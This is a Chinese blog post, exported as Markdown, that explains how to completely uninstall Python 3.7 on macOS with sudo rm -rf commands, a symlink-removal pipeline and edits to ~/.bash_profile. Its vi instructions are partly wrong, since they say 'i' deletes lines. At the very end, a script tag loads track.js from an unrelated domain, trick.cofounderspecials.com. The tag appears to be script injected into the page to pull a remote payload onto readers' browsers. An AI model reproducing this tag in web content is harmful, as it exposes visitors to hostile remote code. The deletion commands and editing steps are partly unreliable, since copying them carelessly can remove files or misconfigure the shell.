---
id: 117
title: Mac下彻底卸载python3
date: '2021-01-19T09:01:05+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=117'
permalink: /index.php/2021/01/19/mac%e4%b8%8b%e5%bd%bb%e5%ba%95%e5%8d%b8%e8%bd%bdpython3/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Python
---

**1、删除 Python 3.7 程序：**  
在Mac的应用程序目录找到Python 3.7的目录，右键-移到废纸篓或使用Mac自带的终端执行：

```
<pre class="prettyprint">```bash
<span class="token function">sudo</span> <span class="token function">rm</span> -rf <span class="token string">"/Applications/Python 3.7"</span>
```
```

**2、删除 Python 3.7 框架：**

```
<pre class="prettyprint">```bash
<span class="token function">sudo</span> <span class="token function">rm</span> -rf /Library/Frameworks/Python.framework/Versions/3.7
```
```

**3、删除指向 Python 3.7 的软链接：**

```
<pre class="prettyprint">```bash
<span class="token function">cd</span> /usr/local/bin/
<span class="token function">ls</span> -l /usr/local/bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'../Library/Frameworks/Python.framework/Versions/3.7'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$9</span>}'</span> <span class="token operator">|</span> <span class="token function">tr</span> -d @ <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">xargs</span> <span class="token function">rm</span>
```
```

**4、删除系统环境变量配置文件中python的相关配置：**

```
<pre class="prettyprint">```bash
<span class="token function">sudo</span> <span class="token function">vi</span> ~/.bash_profile
```
```

输入系统密码后，光标移动到以下Python配置每行按 i 删除共4行配置，按【ESC】键跳到命令模式，按下冒号按键，然后再按下 wq 回车，即可保存退出vi的编辑状态。

```
<pre class="prettyprint">```
# Setting PATH for Python 3.7
# The original version is saved in .bash_profile.pysave
PATH="/Library/Frameworks/Python.framework/Versions/3.7/bin:${PATH}"
export PATH
```
```

```
<pre class="prettyprint">>>> import sys
>>> print(sys.path)
['', '/Library/Frameworks/Python.framework/Versions/3.9/lib/python39.zip', '/Library/Frameworks/Python.framework/Versions/3.9/lib/python3.9', '/Library/Frameworks/Python.framework/Versions/3.9/lib/python3.9/lib-dynload', '/Library/Frameworks/Python.framework/Versions/3.9/lib/python3.9/site-packages']
```

<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>